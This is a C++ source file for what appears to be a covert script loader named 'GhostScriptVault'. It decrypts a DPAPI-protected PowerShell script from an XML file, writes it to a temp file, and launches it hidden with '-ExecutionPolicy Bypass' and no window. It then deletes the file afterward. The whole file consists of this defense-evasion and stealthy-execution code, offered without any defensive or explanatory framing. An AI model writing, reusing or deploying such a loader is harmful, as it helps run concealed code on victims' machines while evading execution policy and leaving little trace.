#include "GhostScriptVault.h"
#include "DPAPIDecryptor.h"

#include <windows.h>
#include <iostream>
#include <fstream>

namespace GhostScriptVault {

    bool decrypt_script(const std::string& xmlPath, std::string& outScript) {
        return DPAPIDecryptor::decrypt_from_xml(xmlPath, outScript);
    }

    bool execute_decrypted_script(const std::string& scriptContents) {
        // Write to temp .ps1 file
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);

        std::string scriptFile = std::string(tempPath) + "temp_script.ps1";

        std::ofstream out(scriptFile);
        if (!out.is_open()) {
            std::cerr << "[Vault] Failed to write temp script." << std::endl;
            return false;
        }

        out << scriptContents;
        out.close();

        std::string cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + scriptFile + "\"";

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (!CreateProcessA(nullptr, (LPSTR)cmd.c_str(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            std::cerr << "[Vault] Failed to launch script via PowerShell." << std::endl;
            return false;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        DeleteFileA(scriptFile.c_str());
        return true;
    }

}
